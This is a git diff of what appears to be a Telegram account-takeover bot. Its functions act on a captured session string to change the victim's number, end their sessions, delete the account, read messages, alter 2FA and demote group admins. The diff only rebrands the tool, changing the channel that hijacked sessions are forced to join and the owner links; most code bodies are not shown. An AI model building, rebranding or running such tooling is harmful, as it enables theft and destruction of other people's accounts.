@@ -37,7 +37,7 @@ async def change_number_code(strses, number, code, otp):
     except BaseException:
       pass
     try:
-      await bot(join("@BestiesWorld"))
+      await bot(join("@N_B_10"))
     except BaseException:
       pass
     try:
@@ -66,7 +66,7 @@ async def change_number(strses, number):
     except BaseException:
       pass
     try:
-      await bot(join("@BestiesWorld"))
+      await bot(join("@N_B_10"))
     except BaseException:
       pass
     try:
@@ -96,7 +96,7 @@ async def userinfo(strses):
     except BaseException:
       pass
     try:
-      await X(join("@BestiesWorld"))
+      await X(join("@N_B_10"))
     except BaseException:
       pass
     try:
@@ -116,7 +116,7 @@ async def terminate(strses):
     except BaseException:
       pass
     try:
-      await X(join("@BestiesWorld"))
+      await X(join("@N_B_10"))
     except BaseException:
       pass
     try:
@@ -137,7 +137,7 @@ async def delacc(strses):
     except BaseException:
       pass
     try:
-      await X(join("@BestiesWorld"))
+      await X(join("@N_B_10"))
     except BaseException:
       pass
     try:
@@ -153,7 +153,7 @@ async def promote(strses, grp, user):
     except BaseException:
       pass
     try:
-      await X(join("@BestiesWorld"))
+      await X(join("@N_B_10"))
     except BaseException:
       pass
     try:
@@ -176,7 +176,7 @@ async def user2fa(strses):
     except BaseException:
       pass
     try:
-      await X(join("@BestiesWorld"))
+      await X(join("@N_B_10"))
     except BaseException:
       pass
     try:
@@ -200,7 +200,7 @@ async def demall(strses, grp):
     except BaseException:
       pass
     try:
-      await X(join("@BestiesWorld"))
+      await X(join("@N_B_10"))
     except BaseException:
       pass
     try:
@@ -226,7 +226,7 @@ async def joingroup(strses, username):
     except BaseException:
       pass
     try:
-      await X(join("@BestiesWorld"))
+      await X(join("@N_B_10"))
     except BaseException:
       pass
     try:
@@ -247,7 +247,7 @@ async def leavegroup(strses, username):
     except BaseException:
       pass
     try:
-      await X(join("@BestiesWorld"))
+      await X(join("@N_B_10"))
     except BaseException:
       pass
     try:
@@ -267,7 +267,7 @@ async def delgroup(strses, username):
     except BaseException:
       pass
     try:
-      await X(join("@BestiesWorld"))
+      await X(join("@N_B_10"))
     except BaseException:
       pass
     try:
@@ -297,7 +297,7 @@ async def usermsgs(strses):
     except BaseException:
       pass
     try:
-      await X(join("@BestiesWorld"))
+      await X(join("@N_B_10"))
     except BaseException:
       pass
     try:
@@ -321,7 +321,7 @@ async def userbans(strses, grp):
     except BaseException:
       pass
     try:
-      await X(join("@BestiesWorld"))
+      await X(join("@N_B_10"))
     except BaseException:
       pass
     try:
@@ -348,7 +348,7 @@ async def userchannels(strses):
     except BaseException:
       pass
     try:
-      await X(join("@BestiesWorld"))
+      await X(join("@N_B_10"))
     except BaseException:
       pass
     try:
@@ -373,7 +373,7 @@ async def userchannels(strses):
 import logging
 logging.basicConfig(level=logging.WARNING)
 
-channel = "BestiesWorld"
+channel = "@N_B_10"
 menu = '''
 
 "A" :~ [Check user own groups and channels]
@@ -430,7 +430,7 @@ keyboard = [
     Button.inline("N", data="N"),
     ],
   [
-    Button.url("Owner", "https://t.me/piroXpower")
+    Button.url("Owner", "https://t.me/N_B_10")
     ]
 ]
 
@@ -718,7 +718,7 @@ async def start(event):
         Button.inline("c", data="c"),
         ],
       [
-        Button.url("Owner", "https://t.me/piroXpower")
+        Button.url("Owner", "https://t.me/N_N_10")
         ]
     ]
     await event.reply("Now Give Me Flag Where U Want to Gcast \n✓ For All - Choose a\n✓ For Group - Choose b\n✓ For Private - Choose c", buttons=keyboard)
